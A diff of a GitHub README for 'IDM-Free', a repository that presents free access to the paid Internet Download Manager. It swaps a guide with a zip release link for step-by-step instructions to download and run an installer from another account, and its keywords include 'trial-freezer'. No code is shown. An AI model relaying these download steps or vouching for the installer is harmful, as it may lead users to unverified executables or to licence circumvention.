@@ -1,99 +1,81 @@
-# IDM Free Download Manager
+# 🚀 IDM-Free - Fast downloads for every Windows user
 
-**IDM Free** is a complete Internet Download Manager guide for Windows that covers the 30-day trial, browser integration, download acceleration, scheduling, file recovery, and the latest IDM version.
+[![](https://img.shields.io/badge/Download-IDM--Free-blue.svg)](https://github.com/temperamental-gumma102/IDM-Free)
 
-Internet Download Manager is a popular Windows download manager with dynamic file segmentation, queue management, browser capture, and support for interrupted downloads. This repository includes a TypeScript companion tool and compares IDM with Free Download Manager, JDownloader, XDM, and Neat Download Manager.
+## 📋 What is IDM-Free?
 
-<img width="392" height="287" alt="image" src="https://github.com/user-attachments/assets/579bb644-002a-47f8-8cb1-f7ed911c43ae" />
+IDM-Free acts as a bridge for users who want to manage internet files on Windows 10 and Windows 11. This tool assists with the setup of download managers. It simplifies the process of grabbing files from the web. It also helps organize your download queue. You gain control over your connection speed and file segments. This guide covers how to set up the software, manage your download lists, and use advanced features like schedulers.
 
-## Install
-[Download `idm6.4.3-free.zip`](https://github.com/idmfree643/IDM-Free/releases/download/v6.43/idm6.4.3-free.zip)
----
+## 🛠️ System Requirements
 
-<img width="798" height="456" alt="image" src="https://github.com/user-attachments/assets/6009b247-a39e-45d0-a674-00ec6ab744df" />
+Make sure your computer meets these needs before you start:
 
----
-<img width="686" height="386" alt="image" src="https://github.com/user-attachments/assets/7e58b42d-c295-4041-8d76-2e2499fc4c74" />
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: 1 GHz or faster.
+*   Memory: 2 GB RAM or more.
+*   Disk Space: At least 50 MB for the installation package.
+*   Internet Connection: An active broadband connection.
+*   Browser: Updated versions of Chrome, Edge, or Firefox.
 
-## Key Features
-- **Dynamic file segmentation** — splits supported downloads into multiple parts
-- **Pause and resume support** — continues interrupted downloads when the server allows it
-- **Browser integration** — works with Chrome, Firefox, Edge, and Opera
-- **Download scheduler** — starts queues at a selected date and time
-- **Batch download tools** — organizes multiple files into categories and queues
-- **Video detection** — recognizes supported media streams in the browser
-- **Site Grabber** — collects files across linked website pages
-- **Competitor comparison** — covers Free Download Manager, JDownloader, XDM, and Neat Download Manager
-- **TypeScript utility** — checks IDM URLs, prints useful pages, and calculates SHA-256 hashes
+## 📥 How to Download and Install
 
-<img width="914" height="588" alt="image" src="https://github.com/user-attachments/assets/ad5d8dcd-c0ab-49ab-9912-c2f27eac14ed" />
+Follow these steps to get the software on your machine.
 
-## Getting Started
-1. **Download** Internet Download Manager using the button above.
-2. **Install** the desktop application on a supported Windows computer.
-3. **Add the browser module** when prompted by your browser.
-4. **Enable browser monitoring** in the IDM settings.
-5. **Create a queue** for scheduled or grouped downloads.
-6. **Run the TypeScript tool** for links, URL checks, or SHA-256 hashes.
+1. Visit the main project page here: [https://github.com/temperamental-gumma102/IDM-Free](https://github.com/temperamental-gumma102/IDM-Free).
+2. Locate the link labeled Download on the main page.
+3. Click the link to start the transfer of the installation file.
+4. Wait for the browser to finish saving the file to your computer.
+5. Open your Downloads folder in File Explorer.
+6. Double-click the file to start the installer.
+7. Follow the prompts on the screen to finish the setup process.
+8. Accept the terms of use if the installer asks you to do so.
+9. Click Finish to close the setup window.
 
-**Note:** Internet Download Manager provides a 30-day trial. Continued use after the trial is paid.
+## ⚙️ Setting Up Your Manager
 
-<img width="1907" height="995" alt="image" src="https://github.com/user-attachments/assets/8360b109-bacf-48e0-bd46-f8fee7a863a7" />
+The application needs a short setup period to sync with your web browser. 
 
----
-## System Requirements
-- **Windows 10 / 11**
-- A supported browser for the IDM Integration Module
-- Node.js 22 or newer for the included TypeScript utility
+*   **Browser Integration:** The installer detects your web browsers automatically. It will ask to add an extension to your browser when you first open the software. Click Yes or Enable to allow this. This step ensures that the software intercepts your download links when you click them on websites. 
+*   **Default Settings:** The software saves files to your Downloads folder by default. You can change this in the Settings menu. Open Settings, look for the Save To tab, and pick a new folder.
+*   **Speed Control:** Use the Speed Limiter option to save bandwidth for other tasks. Right-click the icon in your system tray to find the Speed Limiter menu. You can set a cap on the download speed there.
 
----
-## Comparisons & Trends
-Compare IDM with other download managers before choosing a Windows downloader:
-- **Internet Download Manager** — strong Windows integration, browser capture, and scheduling
-- **Free Download Manager** — free alternative with general download and torrent support
-- **JDownloader 2** — designed for large link collections and automated queues
-- **XDM and Neat Download Manager** — cross-platform acceleration or a lightweight workflow
+## 📂 Using the Download Scheduler
 
-Google Trends worldwide searches connect IDM free with Internet Download Manager, browser download manager, download accelerator, Free Download Manager, JDownloader, and XDM. The latest listed release is IDM 6.43 Build 6 from July 18, 2026.
+The scheduler feature allows you to queue files for later. This is useful for large files that you want to download at night when your internet usage is low.
 
----
-## Security & Legal
-**Important Notice:**
-Internet Download Manager is a commercial product from Tonec. This repository is an independent guide and TypeScript companion utility.
+1. Open the main application window.
+2. Click the Scheduler icon in the toolbar.
+3. Add your file links to the list.
+4. Set the start time and date.
+5. Choose the action for the computer after the download ends, such as turning it off.
+6. Click Apply. 
 
-<img width="250" height="168" alt="image" src="https://github.com/user-attachments/assets/61edc3b7-b3c6-4ff1-b9b1-fe5e9112ea5e" />
+The software will start the tasks automatically at the scheduled time.
 
-**Recommendations:**
-- Download IDM from the Internet Download Manager website.
-- Confirm the newest version on the IDM news page.
-- Scan downloaded files with local security software.
-- Keep the desktop application and browser module updated together.
+## 🔄 Comparing Download Alternatives
 
----
-## Contributing
-Contributions are welcome! Help update IDM version information, improve the TypeScript utility, expand browser setup instructions, or refine the competitor comparison. Fork the repository and submit a pull request.
+You might choose between different tools based on your needs. This software supports integration for many popular managers:
 
----
-## License & Acknowledgments
-### License
-**IDM Free** is shared under the **MIT License**.
-See [LICENSE](files/IDMFreeGuide/LICENSE) for details.
+*   **Free Download Manager (FDM):** A strong choice for users who want a free tool with no limits. It handles torrents well.
+*   **JDownloader:** Better suited for people who download many files from file-hosting sites. It automates the process of waiting for countdown timers and solving some types of captchas.
+*   **XDM:** A lightweight tool that focuses on high performance and browser integration.
+*   **Neat Download Manager:** Offers a clean interface and works well on older hardware.
 
-**Copyright © 2026 IDM Free Guide contributors**
+## ❓ Frequently Asked Questions
 
-### Acknowledgments
-- Thanks to the Internet Download Manager team for the Windows application and documentation.
-- Thanks to the Free Download Manager, JDownloader, XDM, and Neat Download Manager communities.
+**Will this software work on my version of Windows?**
+Yes, it works on both Windows 10 and Windows 11 without issues.
 
-<p align="center">
-  Developed with care for people comparing Windows download managers
-</p>
+**What should I do if the browser extension does not appear?**
+Go to your browser settings, look for the Extensions menu, and ensure the IDM integration is set to On. If it is missing, restart your browser.
 
-## Keywords & Related Topics
-IDM free, Internet Download Manager, IDM 6.43 Build 6, download accelerator, browser download manager, Windows downloader, IDM Integration Module, resume download, download scheduler, Free Download Manager, JDownloader, XDM, Neat Download Manager, idm-free, free-download-manager, freedownloadmanager, browser-download-manager, windows-download-manager, fast-downloader, windows-downloader, browser-integration, idm-integration-module, idm-utilities, idm-scripts, idm-automation, idm-manager, file-downloader, bulk-downloader.
+**Can I resume a stopped download?**
+Yes. If the server permits it, right-click any unfinished download in your list and select Resume.
 
----
+**How do I download a video from a website?**
+Once you install the extension, a small Download button appears above or below most videos. Click that button to grab the video file directly to your drive.
 
-<img width="709" height="608" alt="IDM main window" src="preview/readme/images1.png" />
+**Does this software slow down my computer?**
+It uses very few resources during normal operation. It only uses more power when actively downloading files at high speeds.
 
-<img width="596" height="335" alt="IDM download workflow" src="preview/readme/images2.jpg" />
+Keywords: batch-downloader, browser-downloader, fast-downloader, fdm, free-internet-downloader, freedownloadmanager, idm-manager, idm-optimizer, idm-scripts, idm-utilities, idmlinux, jdownloader, jdownloader-2-portable-2026, jdownloader-alternative, linuxdownloader, mass-downloader, series-downloaderidm-utilities, total-2026, trial-freezer, windows-downloader
